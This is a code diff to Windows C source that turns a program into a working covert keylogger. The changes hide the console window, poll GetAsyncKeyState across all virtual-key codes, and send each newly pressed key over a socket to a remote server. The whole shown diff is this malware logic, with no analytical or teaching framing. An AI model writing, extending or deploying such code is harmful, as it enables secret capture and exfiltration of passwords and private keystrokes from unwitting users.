@@ -13,11 +13,10 @@
         SOCKET connectionSocket;
         SOCKADDR_IN serverAddr;
         //DWORD connResult, transferredBytes
-        DWORD connectionStatus = 1;
         CHAR charToSend;
 
         //HIDE CONSOLE VIEW
-        //FreeConsole();
+        FreeConsole();
 
         //INITIALIZE WINDOWS SOCKET API
         if(WSAStartup(WSA_VERSION_CODE, &wsadata) != 0){
@@ -45,12 +44,24 @@
             return -1;    
         }
         
-        while(connectionStatus){
-            //Scan character(key) input
+        int vk;
+        BOOL keyWasDown[256] = {FALSE};
+        BOOL keepRunning = TRUE;
+
+        while(keepRunning){
             Sleep(10);
-            for(charToSend = 8; (charToSend < 190 && connectionStatus); charToSend++){
-                if(GetAsyncKeyState(charToSend) == -32767){
-                    connectionStatus = 0;
+            for(vk = 0x08; vk <= 0xFE; vk++){
+                if(GetAsyncKeyState(vk) & 0x8000){
+                    if(!keyWasDown[vk]){
+                        keyWasDown[vk] = TRUE;
+                        charToSend = (CHAR)vk;
+                        if(send(connectionSocket, &charToSend, 1, 0) == SOCKET_ERROR){
+                            keepRunning = FALSE;
+                            break;
+                        }
+                    }
+                }else{
+                    keyWasDown[vk] = FALSE;
                 }
             }
         }
